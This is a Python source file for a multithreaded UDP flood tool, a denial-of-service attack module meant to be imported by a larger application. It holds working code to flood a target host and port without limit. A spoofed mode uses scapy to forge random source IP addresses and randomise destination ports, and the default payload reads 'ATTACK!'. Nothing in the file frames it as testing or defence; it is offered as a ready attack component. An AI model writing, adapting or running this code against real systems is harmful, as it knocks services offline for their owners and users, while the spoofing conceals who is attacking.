import socket
import time
import random
import threading

from typing import Literal
from scapy.all import IP as scapy_IP, UDP as scapy_UDP, send as scapy_send


class Flooder():
    """
    A core UDP flooder class for sending packets.
    Designed to be imported and controlled by a main application.
    """
    def __init__(self, target_host: str, target_port: int, message: str = "ATTACK!", thread_count: int = 10):
        if not isinstance(target_host, str) or not target_host:
            raise ValueError("target_host must be a non-empty string.")
        if not isinstance(target_port, int) or not (0 < target_port < 65536):
            raise ValueError("target_port must be a valid port number (1-65535).")
        if not isinstance(message, str):
            raise ValueError("message must be a string.")

        self.target_host = target_host
        self.target_port = target_port
        self.thread_count = thread_count

        self._default_message = message.encode()

        self.running: bool = True
        self.packets_sent = 0
        self.packet_lock = threading.Lock()

    def random_ip(self) -> str:
        return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def random_port(self) -> int:
        return random.randint(1, 65535)

    def start(self, packet_count: int = -1, message: bytes = None, is_threaded: bool = False):
        message_to_send = message if message is not None else self._default_message
        current_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 

        while self.running and (packet_count == -1 or self.packets_sent < packet_count):
            try:
                current_socket.sendto(message_to_send, (self.target_host, self.target_port))
                
                with self.packet_lock:
                    self.packets_sent += 1
                    if self.packets_sent % 1000 == 0:
                        print(f"[+] Sent {self.packets_sent} packets.")

                if not is_threaded:
                    time.sleep(0.00001)

            except socket.error as e:
                print(f"[!] Socket Error sending to {self.target_host}:{self.target_port}: {e}")
                self.stop() 
                break
            except Exception as e:
                print(f"[!] General Error: {e}")
                self.stop()
                break
        
        current_socket.close()

    def start_spoofed(self, packet_count: int = -1, message: bytes = None, randomize_ports: bool = False, is_threaded: bool = False):
        """
        Starts a spoofed UDP flood.
        It can either target a single port or randomize ports for each packet.
        """
        message_to_send = message if message is not None else self._default_message
        
        while self.running and (packet_count == -1 or self.packets_sent < packet_count):
            # Determine the destination port
            if randomize_ports:
                destination_port = self.random_port()
            else:
                destination_port = self.target_port
                
            # Construct the IP layer with a SPOOFED and RANDOM source IP
            ip_layer = scapy_IP(src=self.random_ip(), dst=self.target_host)

            # Construct the UDP layer for the chosen destination port
            udp_layer = scapy_UDP(dport=destination_port)

            # Stack the layers and payload together to form the full packet
            packet = ip_layer / udp_layer / message_to_send

            # Send the packet over the wire
            scapy_send(packet, verbose=0)
            
            with self.packet_lock:
                self.packets_sent += 1
                if self.packets_sent % 1000 == 0:
                    print(f"[+] Sent {self.packets_sent} spoofed packets.")
            
            if not is_threaded:
                time.sleep(0.00001)

    def start_threaded(self, flood_type: Literal["default", "spoofed"] = "default", packet_count: int = -1, message: bytes = None, randomize_ports: bool = False):
        self.packets_sent = 0

        if flood_type == "default":
            print(f"[i] Starting {self.thread_count} threads for standard UDP flood.")
            target_method = self.start
            thread_args = (packet_count, message)
        else: # flood_type == "spoofed"
            print(f"[i] Starting {self.thread_count} threads for spoofed UDP flood.")
            target_method = self.start_spoofed
            thread_args = (packet_count, message, randomize_ports)
        
        threads = []
        try:
            for i in range(self.thread_count):
                thread = threading.Thread(target=target_method, args=thread_args)
                threads.append(thread)
                thread.start()

            if packet_count > 0:
                for thread in threads:
                    thread.join()
                print("[i] All threads have finished their work.")
            else:
                while self.running:
                    time.sleep(1)
                
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            print(f"[!] Error: {e}")
            self.stop()
        finally:
            if packet_count < 0:
                print("[i] Main thread finished.")

    def stop(self):
        # ... (unchanged)
        if self.running:
            self.running = False
            print(f"\n[i] Stopping flooder. Total packets sent: {self.packets_sent}")
